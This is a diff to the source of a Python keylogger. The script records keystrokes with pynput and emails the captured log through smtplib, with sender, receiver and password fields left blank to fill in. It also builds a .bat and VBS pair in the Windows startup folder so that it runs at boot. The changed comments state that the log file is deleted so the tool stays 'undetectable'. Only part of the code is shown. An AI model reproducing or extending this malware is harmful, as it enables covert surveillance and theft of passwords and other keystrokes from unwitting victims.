@@ -1,20 +1,20 @@
 import os.path
 from pynput import keyboard
 import smtplib, ssl
-from email.message import EmailMessage
+from email.message import EmailMessage              #This are all the libraries we need.
 from os import remove
 import sys
 import getpass
 
 
-path_txt_teclado = 'key_logger.txt'             #Here we define the path where is going to be the txt file with all de keys that are pressed.
+path_txt_teclado = 'key_logger.txt'             #Here we define the path where is going to be the txt file with all the keys that are pressed.
 
 sender = ''
 reciver = ''            #You must fill this variable with the sender email, reciver email and the email password.
 password = ''
 
 count = 0
-f = open(path_txt_teclado , 'w')        #Creation of the txt that I mentioned before.
+f = open(path_txt_teclado , 'w')        #Creation of the txt that I mentioned before. It'll be deleted instantly to be undetectable.
 f.close()
 f = open(path_txt_teclado , 'r')
 
@@ -75,7 +75,7 @@ def send_email(sender,reciver, password):
     server.quit()
 
 
-#Function that makes a .bat file that will be run by a vbs file which is save in a path that runs all the files it contains.
+#Function that makes a .bat file that will be run by a vbs file which is save in a path that runs all the files it contains when Windows is iniciated.
 
 def move_file():
     user_name = getpass.getuser()
